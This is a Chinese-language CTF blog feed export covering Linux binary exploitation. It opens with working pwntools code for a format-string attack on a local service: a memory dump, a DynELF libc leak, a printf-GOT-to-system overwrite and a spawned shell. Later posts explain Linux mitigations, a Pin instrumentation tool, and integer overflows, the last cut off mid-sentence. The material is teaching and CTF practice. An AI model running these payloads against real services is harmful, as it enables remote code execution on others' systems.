<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_process_memory</span>(<span class="params">start, mem_len</span>):</span></span><br><span class="line">    dump_len = <span class="number">0</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> dump_len &lt; mem_len:</span><br><span class="line">        p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;8888&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Ping me\n&quot;</span>)</span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;$s-ABC&quot;</span>.<span class="built_in">format</span>(vuln_offset + <span class="number">2</span>) + p32(start + dump_len)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        data = p.recvuntil(<span class="string">&quot;-ABC&quot;</span>)[:-<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        dump_len += <span class="built_in">len</span>(data)</span><br><span class="line">        result += data</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">dump_data = dump_process_memory(<span class="number">0x8048000</span>, <span class="number">0x1000</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;dump&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f.write(dump_data)</span><br><span class="line">f.close()</span><br><span class="line">log.info(<span class="string">&quot;dump over...&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这样就拿到了部分二进制文件，目前还缺少libc，假设可以拿到libc，那么就要查看dump下来的文件，获取<code>printf</code>的got在于libc库比较，得到具体的libc，之后就是常规的计算偏移</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace/format_vuln$ readelf -r dump | grep <span class="built_in">printf</span></span><br><span class="line">08049974  00000207 R_386_JUMP_SLOT   00000000   <span class="built_in">printf</span>@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>假设拿不到libc文件，那么就使用DynELF模块来泄露函数地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    payload = <span class="string">&quot;%9$s-ABC&quot;</span> + p32(addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recvuntil(<span class="string">&quot;-ABC&quot;</span>)[:-<span class="number">4</span>] + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    log.info(<span class="string">&quot;leaking: 0x%x --&gt; %s&quot;</span> % (addr, data.encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;8888&quot;</span>)</span><br><span class="line">dynelf = DynELF(leak, <span class="number">0x08048490</span>)	<span class="comment"># 0x08048490为dump下来文件中main函数地址</span></span><br><span class="line">system_addr = dynelf.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">printf_addr = dynelf.lookup(<span class="string">&#x27;printf&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;system addr =&gt; %s&quot;</span> % <span class="built_in">hex</span>(system_addr))</span><br><span class="line">log.info(<span class="string">&quot;printf addr =&gt; %s&quot;</span> % <span class="built_in">hex</span>(printf_addr))</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/8.png"></p>
<p>最后在在将<code>printf</code>的got地址替换为<code>system</code>的真实地址，传入<code>/bin/sh</code>即可获得shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print_got = <span class="number">0x08049974</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;print_got : system_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/9.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Pwn - 安全机制</title>
    <url>/2021/02/23/Linux-Pwn-%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>Linux下的安全机制有：</p>
<ul>
<li>Stack Canaries</li>
<li>NX</li>
<li>ASLR/PIE</li>
<li>FORTIFY_SOURCE</li>
<li>RELRO</li>
</ul>
<a id="more"></a>

<h2 id="Stack-Canaries"><a href="#Stack-Canaries" class="headerlink" title="Stack Canaries"></a>Stack Canaries</h2><p>Linux平台上的安全cookie（与Windows上安全cookie具有相同的作用），用于缓解缓冲区溢出</p>
<p>Canaries通常可以分为三类：</p>
<table>
<thead>
<tr>
<th align="center">种类</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>Terminator Canaries</strong></td>
<td align="center">Canaries的低位被设置为<code>\x00</code>，可以用来截断字符串</td>
</tr>
<tr>
<td align="center"><strong>Random Canaries</strong></td>
<td align="center">在程序初始化时生成一个随机值，并保存一份备份在一个相对安全的地方（TLS）<br>在Linux中，TLS在<code>fs</code>指向的位置（x64），而在x86下则是<code>gs</code><br>Canaries值位于<code>fs:[0x28]</code>或<code>gs:[0x14]</code></td>
</tr>
<tr>
<td align="center"><strong>Random XOR Canaries</strong></td>
<td align="center">在Random Canaries基础上增加了异或操作</td>
</tr>
</tbody></table>
<p><code>checksec.sh</code>检查如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="variable">$&#123;readelf&#125;</span> -s <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> 2&gt;/dev/null | grep -Eq <span class="string">&#x27;__stack_chk_fail|__intel_security_cookie&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  echo_message <span class="string">&#x27;\033[32mCanary found   \033[m   &#x27;</span> <span class="string">&#x27;Canary found,&#x27;</span> <span class="string">&#x27; canary=&quot;yes&quot;&#x27;</span> <span class="string">&#x27;&quot;canary&quot;:&quot;yes&quot;,&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  echo_message <span class="string">&#x27;\033[31mNo canary found\033[m   &#x27;</span> <span class="string">&#x27;No Canary found,&#x27;</span> <span class="string">&#x27; canary=&quot;no&quot;&#x27;</span> <span class="string">&#x27;&quot;canary&quot;:&quot;no&quot;,&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>


<h2 id="No-eXecute"><a href="#No-eXecute" class="headerlink" title="No-eXecute"></a>No-eXecute</h2><p>相当于Windows平台上的DEP（数据执行保护），NX的实现由软件和硬件共同完成</p>
<ul>
<li>硬件层：利用CPU的NX位，对相应页表项中的第63位进行设置<ul>
<li>NX=1，不可知性</li>
<li>NX=0，可执行</li>
</ul>
</li>
<li>软件层面：需要操作系统支持NX以配置页表，涉及相关API<ul>
<li>Windows：<code>VirtualAlloc</code>、<code>VirtualProtect</code>等</li>
<li>Linux：<code>mmap</code>、<code>mprotect</code>等</li>
</ul>
</li>
</ul>
<p><code>checksec.sh</code>检查如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="variable">$&#123;readelf&#125;</span> -l <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> 2&gt;/dev/null | grep -q <span class="string">&#x27;GNU_STACK&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> <span class="variable">$&#123;readelf&#125;</span> -l <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> 2&gt;/dev/null | grep <span class="string">&#x27;GNU_STACK&#x27;</span> | grep -q <span class="string">&#x27;RWE&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">    echo_message <span class="string">&#x27;\033[31mNX disabled\033[m   &#x27;</span> <span class="string">&#x27;NX disabled,&#x27;</span> <span class="string">&#x27; nx=&quot;no&quot;&#x27;</span> <span class="string">&#x27;&quot;nx&quot;:&quot;no&quot;,&#x27;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    echo_message <span class="string">&#x27;\033[32mNX enabled \033[m   &#x27;</span> <span class="string">&#x27;NX enabled,&#x27;</span> <span class="string">&#x27; nx=&quot;yes&quot;&#x27;</span> <span class="string">&#x27;&quot;nx&quot;:&quot;yes&quot;,&#x27;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  echo_message <span class="string">&#x27;\033[31mNX disabled\033[m   &#x27;</span> <span class="string">&#x27;NX disabled,&#x27;</span> <span class="string">&#x27; nx=&quot;no&quot;&#x27;</span> <span class="string">&#x27;&quot;nx&quot;:&quot;no&quot;,&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>


<h2 id="ASLR和PIE"><a href="#ASLR和PIE" class="headerlink" title="ASLR和PIE"></a>ASLR和PIE</h2><p>ASLR（地址空间随机化），在Linux上ASLR的全局配置为<code>/proc/sys/kernel/randomize_va_space</code>，有以下三种情况：</p>
<ul>
<li><code>0</code>，表示关闭ASLR</li>
<li><code>1</code>，表示部分开启（mmap的基址，stack和vdso页面随机化）</li>
<li><code>2</code>，表示完全开启（增加heap随机化）</li>
</ul>
<p>另外，在PIE（位置无关可执行文件）开启下，相当于可执行文件也支持重定位，即每次执行时的装载地址都会不同</p>
<table>
<thead>
<tr>
<th align="center">ASLR</th>
<th align="center">Executable</th>
<th align="center">PLT</th>
<th align="center">Heap</th>
<th align="center">Stack</th>
<th align="center">Shared Libaries</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">×</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">2 + PIE</td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
</tbody></table>
<p><code>checksec.sh</code>检查如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="variable">$&#123;readelf&#125;</span> -h <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> 2&gt;/dev/null | grep -q <span class="string">&#x27;Type:[[:space:]]*EXEC&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  echo_message <span class="string">&#x27;\033[31mNo PIE       \033[m   &#x27;</span> <span class="string">&#x27;No PIE,&#x27;</span> <span class="string">&#x27; pie=&quot;no&quot;&#x27;</span> <span class="string">&#x27;&quot;pie&quot;:&quot;no&quot;,&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> <span class="variable">$&#123;readelf&#125;</span> -h <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> 2&gt;/dev/null | grep -q <span class="string">&#x27;Type:[[:space:]]*DYN&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> <span class="variable">$&#123;readelf&#125;</span> -d <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> 2&gt;/dev/null | grep -q <span class="string">&#x27;DEBUG&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">    echo_message <span class="string">&#x27;\033[32mPIE enabled  \033[m   &#x27;</span> <span class="string">&#x27;PIE enabled,&#x27;</span> <span class="string">&#x27; pie=&quot;yes&quot;&#x27;</span> <span class="string">&#x27;&quot;pie&quot;:&quot;yes&quot;,&#x27;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    echo_message <span class="string">&#x27;\033[33mDSO          \033[m   &#x27;</span> <span class="string">&#x27;DSO,&#x27;</span> <span class="string">&#x27; pie=&quot;dso&quot;&#x27;</span> <span class="string">&#x27;&quot;pie&quot;:&quot;dso&quot;,&#x27;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">elif</span> <span class="variable">$&#123;readelf&#125;</span> -h <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> 2&gt;/dev/null | grep -q <span class="string">&#x27;Type:[[:space:]]*REL&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  echo_message <span class="string">&#x27;\033[33mREL          \033[m   &#x27;</span> <span class="string">&#x27;REL,&#x27;</span> <span class="string">&#x27; pie=&quot;rel&quot;&#x27;</span> <span class="string">&#x27;&quot;pie&quot;:&quot;rel&quot;,&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  echo_message <span class="string">&#x27;\033[33mNot an ELF file\033[m   &#x27;</span> <span class="string">&#x27;Not an ELF file,&#x27;</span> <span class="string">&#x27; pie=&quot;not_elf&quot;&#x27;</span> <span class="string">&#x27;&quot;pie&quot;:&quot;not_elf&quot;,&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>




<h2 id="FORTIFY-SOURCE"><a href="#FORTIFY-SOURCE" class="headerlink" title="FORTIFY_SOURCE"></a>FORTIFY_SOURCE</h2><p>FORITFY_SOURCE机制相当于glibc的一个安全补丁，可为字符串操作函数提供轻量级的缓冲区溢出攻击和格式化字符串攻击检查。即会将存在隐患的函数替换为更加安全的函数，这些更加安全的函数位于glibc源码的debug目录下</p>
<p>此机制在Unbuntu 16.04（GCC-5.4.0）中是默认关闭的。当指定了O1优化则开启FORTIFY_SOURCE等级1，对于等级2需要手动开启</p>
<ul>
<li><code>-D_FORTIFY_SOURCE=1</code>，开启缓冲区溢出攻击检查</li>
<li><code>-D_FORTIFY_SOURCE=2</code>，开启缓冲区溢出攻击和格式化字符串攻击检查</li>
</ul>
<p><code>checksec.sh</code>检查如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> grep -q <span class="string">&#x27;_chk$&#x27;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$FS_functions</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">  echo_message <span class="string">&#x27;\033[32mYes\033[m&#x27;</span> <span class="string">&#x27;Yes,&#x27;</span> <span class="string">&#x27; fortify_source=&quot;yes&quot; &#x27;</span> <span class="string">&#x27;&quot;fortify_source&quot;:&quot;yes&quot;,&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  echo_message <span class="string">&quot;\033[31mNo\033[m&quot;</span> <span class="string">&quot;No,&quot;</span> <span class="string">&#x27; fortify_source=&quot;no&quot; &#x27;</span> <span class="string">&#x27;&quot;fortify_source&quot;:&quot;no&quot;,&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>




<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO机制为了解决要吃绑定的安全问题而出现，RELOR有两种形式：</p>
<ul>
<li><code>Partial RELRO</code><ul>
<li>一些段（<code>.dynamic</code>、<code>.got</code>等）在初始化后被设置为只读</li>
<li>Ubuntu 16.04 GCC-5.4.0默认开启</li>
</ul>
</li>
<li><code>Full RELRO</code><ul>
<li>禁止延迟绑定，<code>.got.plt</code>段将会合并到<code>.got</code>段中，并且直接初始化为目标函数地址</li>
<li><code>link_map</code>和<code>dl_runtime_resolve</code>不会被装载</li>
</ul>
</li>
</ul>
<p><code>checksec.sh</code>检查如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="variable">$&#123;readelf&#125;</span> -l <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>/exe&quot;</span> 2&gt;/dev/null | grep -q <span class="string">&#x27;Program Headers&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> <span class="variable">$&#123;readelf&#125;</span> -l <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>/exe&quot;</span> 2&gt;/dev/null | grep -q <span class="string">&#x27;GNU_RELRO&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">$&#123;readelf&#125;</span> -d <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>/exe&quot;</span> 2&gt;/dev/null | grep -q <span class="string">&#x27;BIND_NOW&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">echo_message <span class="string">&#x27;\033[32mFull RELRO   \033[m   &#x27;</span> <span class="string">&#x27;Full RELRO,&#x27;</span> <span class="string">&#x27; relro=&quot;full&quot;&#x27;</span> <span class="string">&#x27;&quot;relro&quot;:&quot;full&quot;,&#x27;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">echo_message <span class="string">&#x27;\033[33mPartial RELRO\033[m   &#x27;</span> <span class="string">&#x27;Partial RELRO,&#x27;</span> <span class="string">&#x27; relro=&quot;partial&quot;&#x27;</span> <span class="string">&#x27;&quot;relro&quot;:&quot;partial&quot;,&#x27;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    echo_message <span class="string">&#x27;\033[31mNo RELRO     \033[m   &#x27;</span> <span class="string">&#x27;No RELRO,&#x27;</span> <span class="string">&#x27; relro=&quot;no&quot;&#x27;</span> <span class="string">&#x27;&quot;relro&quot;:&quot;no&quot;,&#x27;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> -n -e <span class="string">&#x27;\033[31mPermission denied (please run as root)\033[m\n&#x27;</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>MyPinTool的基本框架</title>
    <url>/2021/02/20/MyPinTool%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h2 id="MyPinTool"><a href="#MyPinTool" class="headerlink" title="MyPinTool"></a>MyPinTool</h2><a id="more"></a>

<p>在<code>MyPinTool</code>中，其入口点为<code>Ptrace_DllMainCRTStartup</code>函数，但是其也有个<code>main</code>函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( PIN_Init(argc,argv) )</span><br><span class="line">    &#123;	<span class="comment">// 初始化运行库，当错误或者使用-h参数时，打印帮助信息</span></span><br><span class="line">        <span class="keyword">return</span> Usage();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据命令行初始化fileName，为 -o 参数指定的输出文件</span></span><br><span class="line">    <span class="built_in">string</span> fileName = KnobOutputFile.Value();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fileName.empty()) &#123; out = <span class="keyword">new</span> <span class="built_in">std</span>::ofstream(fileName.c_str());&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -count 参数所设置的值，默认为1的时候会注册下面三个插桩函数</span></span><br><span class="line">    <span class="keyword">if</span> (KnobCount)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 注册执行trace命令时所执行的函数</span></span><br><span class="line">        TRACE_AddInstrumentFunction(Trace, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注册每个线程启动时的所执行的函数</span></span><br><span class="line">        PIN_AddThreadStartFunction(ThreadStart, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注册程序退出时所执行的函数</span></span><br><span class="line">        PIN_AddFiniFunction(Fini, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cerr</span> &lt;&lt;  <span class="string">&quot;===============================================&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cerr</span> &lt;&lt;  <span class="string">&quot;This application is instrumented by MyPinTool&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">if</span> (!KnobOutputFile.Value().empty()) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;See file &quot;</span> &lt;&lt; KnobOutputFile.Value() &lt;&lt; <span class="string">&quot; for analysis results&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cerr</span> &lt;&lt;  <span class="string">&quot;===============================================&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动程序，该函数不会返回</span></span><br><span class="line">    PIN_StartProgram();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="帮助信息"><a href="#帮助信息" class="headerlink" title="帮助信息"></a>帮助信息</h3><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Pin tools switches</span><br><span class="line"></span><br><span class="line">-count  [default <span class="number">1</span>]</span><br><span class="line">        count instructions, basic blocks <span class="keyword">and</span> threads <span class="keyword">in</span> <span class="keyword">the</span> application</span><br><span class="line">-logfile  [default pintool.<span class="built_in">log</span>]</span><br><span class="line">        The <span class="built_in">log</span> <span class="built_in">file</span> path <span class="keyword">and</span> <span class="built_in">file</span> name</span><br><span class="line">-o  [default ]</span><br><span class="line">        specify <span class="built_in">file</span> name <span class="keyword">for</span> MyPinTool output</span><br><span class="line">-symbol_path  [default ]</span><br><span class="line">        List <span class="keyword">of</span> paths separated <span class="keyword">with</span> semicolons that is searched <span class="keyword">for</span> symbol</span><br><span class="line">        <span class="keyword">and</span> <span class="built_in">line</span> information</span><br><span class="line">-unique_logfile  [default <span class="number">0</span>]</span><br><span class="line">        The <span class="built_in">log</span> <span class="built_in">file</span> names will contain <span class="keyword">the</span> pid</span><br><span class="line"></span><br><span class="line">Symbols controls</span><br><span class="line"></span><br><span class="line">-ignore_debug_info  [default <span class="number">0</span>]</span><br><span class="line">        Ignore debug info <span class="keyword">for</span> <span class="keyword">the</span> image. Symbols are taken <span class="built_in">from</span> <span class="keyword">the</span> symbol</span><br><span class="line">        tables.</span><br><span class="line">-reduce_rtn_size_mode  [default auto]</span><br><span class="line">        Mode <span class="keyword">for</span> RTN size reduction: <span class="built_in">delete</span> trailing instructions <span class="keyword">after</span> RET <span class="keyword">if</span></span><br><span class="line">        there is no jump <span class="built_in">to</span> <span class="keyword">the</span> rtn part <span class="keyword">after</span> <span class="keyword">the</span> RET. Possible modes are:</span><br><span class="line">        auto/never/always</span><br><span class="line">-short_name  [default <span class="number">0</span>]</span><br><span class="line">        Use <span class="keyword">the</span> shortest name <span class="keyword">for</span> <span class="keyword">the</span> RTN. Names <span class="keyword">with</span> <span class="built_in">version</span> substrings are</span><br><span class="line">        preferred over <span class="keyword">the</span> same name <span class="keyword">without</span> <span class="keyword">the</span> substring.</span><br><span class="line">-support_jit_api  [default <span class="number">0</span>]</span><br><span class="line">        Enables <span class="keyword">the</span> Jitted Functions Support</span><br><span class="line">-unrestricted_rtn_size  [default <span class="number">0</span>]</span><br><span class="line">        Use <span class="keyword">the</span> unrestricted RTN size. When <span class="built_in">set</span> <span class="keyword">the</span> RTN size defined <span class="keyword">by</span> <span class="keyword">the</span></span><br><span class="line">        distance between RTN <span class="built_in">start</span> <span class="built_in">to</span> <span class="keyword">the</span> beginning <span class="keyword">of</span> next RTN.</span><br><span class="line"></span><br><span class="line">Statistic switches</span><br><span class="line"></span><br><span class="line">-profile  [default <span class="number">0</span>]</span><br><span class="line">        print amount <span class="keyword">of</span> memory dynamically allocated but <span class="keyword">not</span> yet freed <span class="keyword">by</span> <span class="keyword">the</span></span><br><span class="line">        tool</span><br><span class="line">-statistic  [default <span class="number">0</span>]</span><br><span class="line">        print general statistics</span><br><span class="line"></span><br><span class="line">General switches (available <span class="keyword">in</span> pin <span class="keyword">and</span> tool)</span><br><span class="line"></span><br><span class="line">-h  [default <span class="number">0</span>]</span><br><span class="line">        Print help message (same <span class="keyword">as</span> -help)</span><br><span class="line">-help  [default <span class="number">0</span>]</span><br><span class="line">        Print help message</span><br><span class="line">-ifeellucky  [default <span class="number">0</span>]</span><br><span class="line">        skip warning message <span class="keyword">for</span> unsupported platforms <span class="keyword">and</span> <span class="built_in">convert</span> some errors</span><br><span class="line">        <span class="built_in">to</span> warnings</span><br><span class="line">-slow_asserts  [default <span class="number">0</span>]</span><br><span class="line">        Perform expensive sanity checks</span><br></pre></td></tr></table></figure>


<h3 id="插桩方式"><a href="#插桩方式" class="headerlink" title="插桩方式"></a>插桩方式</h3><p>Pin提供以下几种插桩方式</p>
<table>
<thead>
<tr>
<th>插桩粒度</th>
<th>API</th>
<th>执行时机</th>
</tr>
</thead>
<tbody><tr>
<td>指令级插桩 <strong>instruction</strong></td>
<td>INS_AddInstrumentFunction</td>
<td>执行一条新指令</td>
</tr>
<tr>
<td>轨迹级插桩 <strong>trace</strong></td>
<td>TRACE_AddInstrumentFunction</td>
<td>执行一个新trace</td>
</tr>
<tr>
<td>镜像级插桩 <strong>image</strong></td>
<td>IMG_AddInstrumentFunction</td>
<td>加载新镜像时</td>
</tr>
<tr>
<td>函数级插桩 <strong>routine</strong></td>
<td>RTN_AddInstrumentFunction</td>
<td>执行一个新函数时</td>
</tr>
</tbody></table>
<ul>
<li>指令级插桩<ul>
<li>对于动态生成的代码也能对其动态插桩</li>
</ul>
</li>
<li>轨迹级插桩<ul>
<li>相当于基本块级的插桩，会在基本块的入口处调用，若其中执行动态生成了新的基本块（新的轨迹），也能对新的轨迹进行动态插桩</li>
</ul>
</li>
<li>镜像级插桩<ul>
<li>依赖符号信息，需要在调用<code>PIN_Init</code>前调用<code>Pin_InitSymbols</code>对程序进行符号分析</li>
</ul>
</li>
<li>函数级插桩<ul>
<li>依赖符号信息，需要在调用<code>PIN_Init</code>前调用<code>Pin_InitSymbols</code>对程序进行符号分析</li>
</ul>
</li>
</ul>
<h3 id="官方示例"><a href="#官方示例" class="headerlink" title="官方示例"></a>官方示例</h3><p>在官方的<code>MyPinTool</code>示例中，注册了三个插桩函数，其中该示例的主要功能在**<em>轨迹级插桩**</em>上</p>
<h4 id="Trace"><a href="#Trace" class="headerlink" title="Trace"></a>Trace</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">CountBbl</span><span class="params">(UINT32 numInstInBbl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bblCount++;</span><br><span class="line">    insCount += numInstInBbl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Trace</span><span class="params">(TRACE trace, VOID *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 遍历每一个基本块</span></span><br><span class="line">    <span class="keyword">for</span> (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 在基本块执行之前插入CountBbl()函数，并传递当前基本块的指令个数</span></span><br><span class="line">        BBL_InsertCall(bbl, IPOINT_BEFORE, (AFUNPTR)CountBbl, IARG_UINT32, BBL_NumIns(bbl), IARG_END);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Pwn - 整数溢出与格式化字符串漏洞</title>
    <url>/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<ul>
<li>整数溢出</li>
<li>格式化字符串漏洞</li>
</ul>
<a id="more"></a>


<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>整数溢出主要有三种情况：</p>
<ul>
<li>溢出<ul>
<li>两正数或两负数相加，符号位改变，产生溢出</li>
<li>OF标志置位</li>
</ul>
</li>
<li>回绕<ul>
<li>无符号数最小值减1或最大值加1产生进位</li>
<li>CF进位标志置位</li>
</ul>
</li>
<li>截断<ul>
<li>宽度大的数值转换为宽度小的数值，发生高位截断</li>
</ul>
</li>
</ul>
<h3 id="容易发生溢出的函数"><a href="#容易发生溢出的函数" class="headerlink" title="容易发生溢出的函数"></a>容易发生溢出的函数</h3><p>溢出需要配合其他漏洞（如栈溢出）才能使用，以<code>size_t</code>类型的参数或返回值的函数是溢出发生比较多的地方，例如：</p>
